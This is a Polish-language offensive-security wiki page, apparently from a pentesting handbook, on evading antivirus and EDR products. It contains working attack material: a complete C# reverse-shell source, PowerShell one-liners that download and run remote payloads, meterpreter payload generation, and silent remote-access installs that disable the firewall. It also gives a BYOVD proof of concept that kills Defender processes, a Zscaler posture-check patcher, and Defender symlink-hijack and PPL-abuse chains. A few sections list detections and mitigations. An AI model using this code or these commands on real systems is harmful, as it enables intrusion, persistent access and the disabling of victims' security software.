Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) już oferuje możliwość wykonywania C# assemblies bezpośrednio w pamięci, ale istnieją różne sposoby, by to zrobić:

- **Fork\&Run**

Polega na **uruchomieniu nowego procesu ofiary**, wstrzyknięciu do niego złośliwego kodu post-exploitation, wykonaniu tego kodu, a po zakończeniu — zabiciu nowego procesu. Ma to swoje zalety i wady. Zaletą metody fork and run jest to, że wykonanie ma miejsce **poza** procesem naszego implantu Beacon. Oznacza to, że jeśli coś pójdzie nie tak w trakcie akcji post-exploitation lub zostanie wykryte, istnieje **znacznie większa szansa**, że nasz **implant przetrwa.** Wadą jest to, że mamy **większe ryzyko** wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Polega na wstrzyknięciu złośliwego kodu post-exploitation **do własnego procesu**. W ten sposób można uniknąć tworzenia nowego procesu i skanowania go przez AV, ale wadą jest to, że jeśli wykonanie payloadu pójdzie nie tak, istnieje **znacznie większa szansa** na **utratę beacona**, ponieważ proces może ulec awarii.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Można też ładować C# Assemblies **z poziomu PowerShell**, zobacz [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz wideo S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu w innych językach, dając skompromitowanej maszynie dostęp **do środowiska interpretera zainstalowanego na Attacker Controlled SMB share**.

Pozwalając na dostęp do Interpreter Binaries i środowiska na udziale SMB, można **wykonywać dowolny kod w tych językach w pamięci** skompromitowanej maszyny.

Repo wskazuje: Defender wciąż skanuje skrypty, ale poprzez wykorzystanie Go, Java, PHP itd. mamy **więcej elastyczności, by obejść sygnatury statyczne**. Testy z losowymi, nie-obsfuskowanymi reverse shellami w tych językach okazały się skuteczne.

## TokenStomping

Token stomping to technika pozwalająca atakującemu na **manipulowanie tokenem dostępu lub produktem zabezpieczającym takim jak EDR czy AV**, umożliwiając obniżenie jego uprawnień tak, że proces nie zginie, ale nie będzie miał uprawnień do sprawdzania złośliwych aktywności.

Aby temu zapobiec, Windows mógłby **zablokować zewnętrznym procesom** uzyskiwanie uchwytów do tokenów procesów zabezpieczeń.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Jak opisano w [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest zainstalować Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia i utrzymania dostępu:
1. Pobierz ze strony https://remotedesktop.google.com/, kliknij "Set up via SSH", a następnie pobierz plik MSI dla Windows, klikając odpowiedni link.
2. Uruchom instalator cicho na maszynie ofiary (wymagane uprawnienia admina): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć na stronę Chrome Remote Desktop i kliknij dalej. Kreator poprosi o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Wykonaj podany parametr z pewnymi modyfikacjami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Zwróć uwagę na parametr pin, który pozwala ustawić pin bez użycia GUI).


## Advanced Evasion

Evasion to bardzo złożony temat — czasem trzeba brać pod uwagę wiele różnych źródeł telemetrii w jednym systemie, więc praktycznie niemożliwe jest pozostanie całkowicie niewykrytym w dojrzałych środowiskach.

Każde środowisko, z którym się mierzymy, będzie miało swoje mocne i słabe strony.

Gorąco zachęcam do obejrzenia tego wystąpienia od [@ATTL4S](https://twitter.com/DaniLJ94), aby zyskać wgląd w bardziej zaawansowane techniki Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To także świetne wystąpienie od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który **usuwa części binarki** aż **wykaże, którą część Defender** uznaje za złośliwą i rozdzieli ją dla Ciebie.\
Inne narzędzie robiące **to samo** to [**avred**](https://github.com/dobin/avred) z otwartą usługą webową na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows 10 włącznie, wszystkie wersje Windows zawierały **Telnet server**, który można było zainstalować (jako administrator) wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Spraw, aby to **uruchamiało się** podczas uruchamiania systemu i **uruchom** to teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnet** (stealth) i wyłącz firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (chcesz binarne pliki, nie setup)

**NA HOŚCIE**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś binarkę _**winvnc.exe**_ i **nowo** utworzony plik _**UltraVNC.ini**_ na maszynę **ofiary**

#### **Reverse connection**

**Atakujący** powinien **uruchomić na swoim hoście** binarkę `vncviewer.exe -listen 5900`, aby była **przygotowana** do przechwycenia odwrotnego **VNC connection**. Potem, na maszynie **ofiary**: Uruchom demona winvnc `winvnc.exe -run` i uruchom `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UWAGA:** Aby zachować dyskrecję, nie rób następujących rzeczy

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywoła to [popup](https://i.imgur.com/1SROTTl.png). Sprawdź czy działa poleceniem `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [okna konfiguracji](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h` po pomoc, bo wywoła to [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Wewnątrz GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom lister** poleceniem `msfconsole -r file.rc` i **wykonaj** **xml payload** za pomocą:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny Defender zakończy proces bardzo szybko.**

### Kompilacja własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj to za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# przy użyciu kompilatora
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchamianie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Przykład użycia Pythona do budowania injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Inne narzędzia
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Wyłączanie AV/EDR z przestrzeni jądra

Storm-2603 wykorzystał niewielkie narzędzie konsolowe znane jako **Antivirus Terminator**, by wyłączyć zabezpieczenia endpoint przed zrzuceniem ransomware. Narzędzie dostarcza własny **podatny, lecz *podpisany* sterownik** i nadużywa go do wykonywania uprzywilejowanych operacji w jądrze, których nawet usługi AV uruchomione jako Protected-Process-Light (PPL) nie są w stanie zablokować.

Kluczowe wnioski
1. **Signed driver**: Plik zapisany na dysku to `ServiceMouse.sys`, ale binarka to legalnie podpisany sterownik `AToolsKrnl64.sys` z Antiy Labs’ “System In-Depth Analysis Toolkit”. Ponieważ sterownik ma ważny podpis Microsoft, ładuje się nawet gdy Driver-Signature-Enforcement (DSE) jest włączone.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwsza linia rejestruje sterownik jako **kernel service**, a druga go uruchamia tak, że `\\.\ServiceMouse` staje się dostępne z poziomu trybu użytkownika.
3. **IOCTLy udostępnione przez sterownik**
| IOCTL code | Możliwość                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Zakończenie dowolnego procesu po PID (używane do zabijania usług Defender/EDR) |
| `0x990000D0` | Usunięcie dowolnego pliku z dysku |
| `0x990001D0` | Odładowanie sterownika i usunięcie usługi |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD całkowicie pomija ochronę w trybie użytkownika; kod wykonujący się w jądrze może otwierać *chronione* procesy, je kończyć lub manipulować obiektami jądra niezależnie od PPL/PP, ELAM lub innych mechanizmów hardeningu.

Wykrywanie / Mitigacja
•  Włącz listę blokowania podatnych sterowników Microsoft (`HVCI`, `Smart App Control`), aby Windows odmawiał załadowania `AToolsKrnl64.sys`.  
•  Monitoruj tworzenie nowych *kernel* services i generuj alerty, gdy sterownik jest ładowany z katalogu zapisywalnego przez wszystkich (world-writable directory) lub nie znajduje się na liście dozwolonych.  
•  Obserwuj uchwyty w trybie użytkownika do niestandardowych obiektów urządzeń, po których następują podejrzane wywołania `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** stosuje reguły device-posture lokalnie i polega na Windows RPC do przekazywania wyników innym komponentom. Dwa słabe wybory projektowe umożliwiają pełne ominięcie:

1. Ocena postawy odbywa się **całkowicie po stronie klienta** (na serwer wysyłana jest wartość boolean).  
2. Wewnętrzne endpointy RPC jedynie weryfikują, że łączący się plik wykonywalny jest **podpisany przez Zscaler** (przez `WinVerifyTrust`).

Poprzez **patchowanie czterech podpisanych binarek na dysku** oba mechanizmy można zneutralizować:

| Binarka | Oryginalna logika (zmieniona) | Efekt |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola jest zgodna |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ dowolny (nawet niepodpisany) proces może podłączyć się do pipe'ów RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Pominięte |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole postawy wykazują **zielone/zgodne**.
* Niepodpisane lub zmodyfikowane pliki binarne mogą otwierać endpointy RPC na nazwanych potokach (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Skompromitowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez polityki Zscaler.

To studium przypadku pokazuje, jak czysto po stronie klienta podejmowane decyzje zaufania i proste kontrole podpisu można pokonać kilkoma poprawkami bajtowymi.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) wymusza hierarchię podpisów/poziomów, tak że tylko procesy chronione o równym lub wyższym poziomie mogą modyfikować siebie nawzajem. W ujęciu ofensywnym, jeśli potrafisz legalnie uruchomić binarkę z włączonym PPL i kontrolować jej argumenty, możesz przekształcić benignną funkcjonalność (np. logowanie) w ograniczony, wspierany przez PPL prymityw zapisu przeciw chronionym katalogom używanym przez AV/EDR.

Co powoduje uruchomienie procesu jako PPL
- Docelowy EXE (i wszystkie załadowane DLL) musi być podpisany z EKU obsługującym PPL.
- Proces musi zostać utworzony przy użyciu CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Musi zostać zażądany kompatybilny poziom ochrony, który pasuje do podpisującego binarkę (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla podpisów anti-malware, `PROTECTION_LEVEL_WINDOWS` dla podpisów Windows). Błędne poziomy spowodują niepowodzenie przy tworzeniu.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Wzorzec użycia:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Podpisany binarny plik systemowy `C:\Windows\System32\ClipUp.exe` samodzielnie tworzy proces i akceptuje parametr umożliwiający zapis pliku logu do ścieżki wskazanej przez wywołującego.
- Jeśli uruchomiony jako proces PPL, zapis pliku odbywa się z uprawnieniami PPL.
- ClipUp nie potrafi parsować ścieżek zawierających spacje; użyj ścieżek 8.3 (short paths), aby wskazać lokalizacje zwykle chronione.

8.3 short path helpers
- Wyświetlenie krótkich nazw: `dir /x` w każdym katalogu nadrzędnym.
- Wyprowadzenie krótkiej ścieżki w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Uruchom LOLBIN zdolny do PPL (ClipUp) z `CREATE_PROTECTED_PROCESS` przy pomocy launchera (np. CreateProcessAsPPL).
2) Przekaż argument ścieżki logu ClipUp, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). Użyj nazw 8.3 jeśli to konieczne.
3) Jeśli docelowy binarny plik jest zwykle otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis podczas rozruchu przed uruchomieniem AV poprzez zainstalowanie usługi auto-start, która pewnie uruchomi się wcześniej. Zweryfikuj kolejność startu za pomocą Process Monitor (boot logging).
4) Po ponownym uruchomieniu zapis z obsługą PPL następuje zanim AV zablokuje swoje binaria, uszkadzając docelowy plik i uniemożliwiając uruchomienie.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie można kontrolować zawartości, które zapisuje ClipUp, poza miejscem zapisu; prymityw nadaje się bardziej do korumpowania niż precyzyjnego wstrzykiwania treści.
- Wymaga lokalnego admina/SYSTEM do zainstalowania/uruchomienia usługi oraz okna na reboot.
- Czasowanie jest krytyczne: cel nie może być otwarty; wykonanie przy starcie systemu unika blokad plików.

Wykrycia
- Tworzenie procesu `ClipUp.exe` z nietypowymi argumentami, szczególnie uruchamianego przez niestandardowe launchery, w okolicach rozruchu.
- Nowe usługi skonfigurowane do auto-startu podejrzanych binarek i systematycznie uruchamiające się przed Defender/AV. Zbadaj tworzenie/modyfikację usług przed wystąpieniem błędów startu Defendera.
- Monitorowanie integralności plików w katalogach Defender binaries/Platform; nieoczekiwane tworzenie/modyfikacje plików przez procesy z flagami protected-process.
- ETW/EDR telemetry: szukaj procesów utworzonych z `CREATE_PROTECTED_PROCESS` oraz anomalnego użycia poziomu PPL przez binarki nie-AV.

Mitigacje
- WDAC/Code Integrity: ogranicz, które podpisane binarki mogą działać jako PPL i pod jakimi procesami macierzystymi; zablokuj wywołania ClipUp poza legalnymi kontekstami.
- Higiena usług: ogranicz tworzenie/modyfikację usług auto-start oraz monitoruj manipulacje kolejnością startu.
- Upewnij się, że Defender tamper protection i early-launch protections są włączone; zbadaj błędy startu wskazujące na korupcję binarek.
- Rozważ wyłączenie generowania nazw 8.3 na woluminach hostujących narzędzia bezpieczeństwa, jeśli zgodne z Twoim środowiskiem (przetestuj dokładnie).

Referencje dla PPL i narzędzi
- Przegląd Microsoft Protected Processes: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- Odniesienie EKU: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (walidacja kolejności): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Opis techniki (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulacja Microsoft Defender za pomocą Platform Version Folder Symlink Hijack

Windows Defender wybiera platformę, z której się uruchamia, poprzez enumerację podfolderów w:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z najwyższym leksykograficznym ciągiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia z niego procesy usługi Defender (aktualizując odpowiednio ścieżki w usługach/rejestrze). Ten wybór ufa wpisom katalogów, w tym directory reparse points (symlinks). Administrator może to wykorzystać, aby przekierować Defendera do ścieżki zapisywalnej przez atakującego i uzyskać DLL sideloading lub zakłócenie działania usługi.

Warunki wstępne
- Lokalny Administrator (wymagany do tworzenia katalogów/symlinków w folderze Platform)
- Możliwość ponownego uruchomienia lub wymuszenia ponownego wyboru platformy Defender (restart usługi przy starcie)
- Wymagane tylko wbudowane narzędzia (mklink)

Dlaczego to działa
- Defender blokuje zapisy w swoich własnych folderach, ale wybór platformy opiera się na zaufaniu wpisom katalogów i wybiera leksykograficznie najwyższą wersję bez weryfikacji, czy docelowa ścieżka rozwiązuje się do chronionej/zaufanej lokalizacji.

Krok po kroku (przykład)
1) Przygotuj zapisywalną kopię bieżącego folderu Platform, np. `C:\TMP\AV`
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz w katalogu Platform symlink do katalogu o wyższej wersji wskazujący na twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wybór Triggera (reboot zalecany):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, że MsMpEng.exe (WinDefend) uruchamia się z przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Powinieneś zauważyć nową ścieżkę procesu w `C:\TMP\AV\` oraz konfigurację usługi/rejestru odzwierciedlającą tę lokalizację.

Post-exploitation options
- DLL sideloading/code execution: Upuść/zastąp DLL-e, które Defender ładuje z katalogu aplikacji, aby uruchomić kod w procesach Defendera. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń version-symlink, tak że przy następnym starcie skonfigurowana ścieżka nie zostanie rozwiązana i Defender nie uruchomi się:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Zwróć uwagę, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga uprawnień administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams mogą przenieść runtime evasion z C2 implant do samego modułu docelowego przez hookowanie jego Import Address Table (IAT) i kierowanie wybranych API przez attacker-controlled, position‑independent code (PIC). To uogólnia evasion poza niewielką powierzchnię API, którą udostępniają wiele kitów (np. CreateProcessA), i rozszerza te same zabezpieczenia na BOFs i post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: skonstruuj pozornie prawidłowy stos i przejdź do docelowego API tak, aby analiza call‑stack wskazywała oczekiwane ramki.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Zastosuj patch po relocacjach/ASLR i przed pierwszym użyciem importu. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs budują fałszywy łańcuch wywołań (adresy powrotu do zaufanych modułów) i następnie pivotują do prawdziwego API.
- To omija detekcje oczekujące kanonicznych stosów z Beacon/BOFs do wrażliwych API.
- Połącz z stack cutting/stack stitching, aby wylądować wewnątrz oczekiwanych ramek przed prologiem API.

Operational integration
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Detection/DFIR considerations
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
